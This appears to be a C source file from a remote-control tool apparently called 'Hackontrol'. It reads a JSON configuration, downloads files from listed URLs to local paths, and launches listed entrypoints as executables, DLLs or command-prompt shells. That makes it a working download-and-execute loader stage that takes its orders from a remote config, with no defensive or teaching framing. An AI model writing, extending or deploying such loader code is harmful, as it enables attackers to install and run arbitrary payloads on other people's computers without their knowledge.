#include <khopanstring.h>
#include <khopanjson.h>
#include <hackontrolcurl.h>
#include "execute.h"

typedef enum {
	ENTRYPOINT_FORMAT_UNKNOWN = 0,
	ENTRYPOINT_FORMAT_EXECUTABLE = 1,
	ENTRYPOINT_FORMAT_DYNAMIC_LINK_LIBRARY = 2,
	ENTRYPOINT_FORMAT_COMMAND_PROMPT_SHELL = 3
} EntrypointFormat;

static void processFileEntry(cJSON* root);
static void processEntrypointEntry(cJSON* root);

void ProcessFilesArray(cJSON* root) {
	cJSON* file = cJSON_GetObjectItem(root, "file");

	if(!file) {
		return;
	}

	if(!cJSON_IsArray(file)) {
		processFileEntry(file);
		return;
	}

	for(int i = 0; i < cJSON_GetArraySize(file); i++) {
		processFileEntry(cJSON_GetArrayItem(file, i));
	}
}

void ProcessEntrypointsArray(cJSON* root) {
	cJSON* entrypoint = cJSON_GetObjectItem(root, "entrypoint");

	if(!entrypoint) {
		return;
	}

	if(!cJSON_IsArray(entrypoint)) {
		processEntrypointEntry(entrypoint);
		return;
	}

	for(int i = 0; i < cJSON_GetArraySize(entrypoint); i++) {
		processEntrypointEntry(cJSON_GetArrayItem(entrypoint, i));
	}
}

static void processFileEntry(cJSON* root) {
	if(!root || !cJSON_IsObject(root)) {
		return;
	}

	LPWSTR filePath = GetFilePath(root);

	if(!filePath) {
		return;
	}

	BOOL match = CheckFileHash(root, filePath);

	if(match) {
		goto freeFilePath;
	}

	LPSTR url = KHJSONGetString(root, "url", NULL);

	if(!url) {
		goto freeFilePath;
	}

	DataStream stream = {0};

	if(!HackontrolDownloadData(&stream, url, TRUE, NULL)) {
		goto freeFilePath;
	}

	HackontrolWriteFile(filePath, &stream);
	KHDataStreamFree(&stream);
freeFilePath:
	LocalFree(filePath);
}

static void processEntrypointEntry(cJSON* root) {
	if(!cJSON_HasObjectItem(root, "format")) {
		return;
	}

	cJSON* formatField = cJSON_GetObjectItem(root, "format");
	EntrypointFormat format = ENTRYPOINT_FORMAT_UNKNOWN;

	if(cJSON_IsNumber(formatField)) {
		unsigned int value = (unsigned int) cJSON_GetNumberValue(formatField);

		if(value >= ENTRYPOINT_FORMAT_EXECUTABLE && value <= ENTRYPOINT_FORMAT_COMMAND_PROMPT_SHELL) {
			format = value;
			goto processFormat;
		}

		return;
	}

	if(!cJSON_IsString(formatField)) {
		return;
	}

	char* stringValue = cJSON_GetStringValue(formatField);

	if(!lstrcmpiA(stringValue, "exe") || !lstrcmpiA(stringValue, "executable") || !lstrcmpiA(stringValue, "pe") || !lstrcmpiA(stringValue, "portable")) {
		format = ENTRYPOINT_FORMAT_EXECUTABLE;
		goto processFormat;
	} else if(!lstrcmpiA(stringValue, "dll") || !lstrcmpiA(stringValue, "dynamic")) {
		format = ENTRYPOINT_FORMAT_DYNAMIC_LINK_LIBRARY;
		goto processFormat;
	} else if(!lstrcmpiA(stringValue, "cmd") || !lstrcmpiA(stringValue, "command") || !lstrcmpiA(stringValue, "shell")) {
		format = ENTRYPOINT_FORMAT_COMMAND_PROMPT_SHELL;
		goto processFormat;
	}

	return;
processFormat:
	if(format == ENTRYPOINT_FORMAT_UNKNOWN) {
		return;
	}

	switch(format) {
	case ENTRYPOINT_FORMAT_EXECUTABLE:
		ProcessEntrypointExecutable(root);
		return;
	case ENTRYPOINT_FORMAT_DYNAMIC_LINK_LIBRARY:
		ProcessEntrypointDynamicLinkLibrary(root);
		return;
	case ENTRYPOINT_FORMAT_COMMAND_PROMPT_SHELL:
		ProcessEntrypointShell(root);
		return;
	}
}
